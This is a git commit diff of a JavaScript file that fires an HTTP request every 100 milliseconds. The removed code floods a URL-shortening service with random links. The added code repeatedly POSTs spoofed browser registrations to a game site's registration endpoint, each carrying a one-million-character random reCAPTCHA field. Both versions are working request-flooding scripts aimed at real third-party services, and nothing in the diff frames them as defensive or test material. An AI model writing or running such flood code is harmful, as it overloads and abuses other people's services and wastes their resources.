457da28452e616f4a085b8d920b569e65ea30e76
n2dhektor <110923395+n2dhektor@users.noreply.github.com>
2022-09-07 18:34:05 +0200

    Update index.js

--- index.js
+++ index.js
@@ -21,20 +21,38 @@ setInterval(()=>{
   
 
 
-fetch("https://shoty.repl.co/create?url=https://"+makeid(20)+".com", {
-    "credentials": "omit",
-    "headers": {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.5; rv:104.0) Gecko/20100101 Firefox/104.0",
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin"
-    },
-    "referrer": "https://shoty.repl.co/",
-    "method": "GET",
-    "mode": "cors"
-});
+function makeid(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+      result += characters.charAt(Math.floor(Math.random() * 
+ charactersLength));
+   }
+   return result;
+}
+fetch("https://theddosgame.com/process.php", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "max-age=0",
+    "content-type": "application/x-www-form-urlencoded",
+    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"104\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Linux\"",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "upgrade-insecure-requests": "1"
+  },
+  "referrer": "https://theddosgame.com/register.php",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "username=&pass=&cpass=&secret=123456&g-recaptcha-response="+makeid(1000000)+"&register=",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+})
 
 
 },100)
